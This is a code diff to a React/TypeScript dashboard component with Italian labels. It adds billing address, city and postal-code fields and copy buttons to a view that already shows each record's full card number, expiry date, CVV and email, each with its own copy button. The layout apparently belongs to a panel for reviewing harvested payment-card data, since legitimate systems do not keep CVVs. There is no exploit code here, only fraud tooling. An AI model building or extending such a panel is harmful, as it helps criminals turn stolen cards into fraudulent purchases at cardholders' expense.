@@ -314,7 +314,9 @@ async function copyText(value: string) {
                 </td>
 
                 <td className="px-2 py-2 align-top break-words">{row.street ?? "—"}</td>
+
                 <td className="px-2 py-2 align-top break-words">{row.city ?? "—"}</td>
+
                 <td className="px-2 py-2 align-top">{row.cap ?? "—"}</td>
                 
                 <td className="px-3 py-2 tracking-wider">
@@ -410,11 +412,17 @@ async function copyText(value: string) {
         <span className="shrink-0 capitalize text-[#9aa8b8]">{row.status}</span>
       </div>
 	  
-	  Numero CC:<p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
+	    Numero CC:<p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
 	  
-	  Scadenza: <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
+	    Scadenza: <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
 	  
-	 CVV: <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>
+	    CVV: <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>
+
+      Indirizzo : <p className="mt-1 break-all text-[#9aa8b8]"> {row.street ?? "—"}</p>
+
+      Citta : <p className="mt-1 break-all text-[#9aa8b8]"> {row.city ?? "—"}</p>
+
+      Cap : <p className="mt-1 break-all text-[#9aa8b8]"> {row.cap ?? "—"}</p>
 
       Email: <p className="mt-1 break-all text-[#9aa8b8]">{row.email}</p>
       
@@ -450,6 +458,27 @@ async function copyText(value: string) {
           onClick={() => copyText(row.security_code)}
         >
           Copy CVV
+        </button>
+        <button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.street ?? "—")}
+        >
+          Copy Addr
+        </button>
+         <button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.city ?? "—")}
+        >
+          Copy City
+        </button>
+          <button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.cap ?? "—")}
+        >
+          Copy Cap
         </button>
 		<button
           type="button"
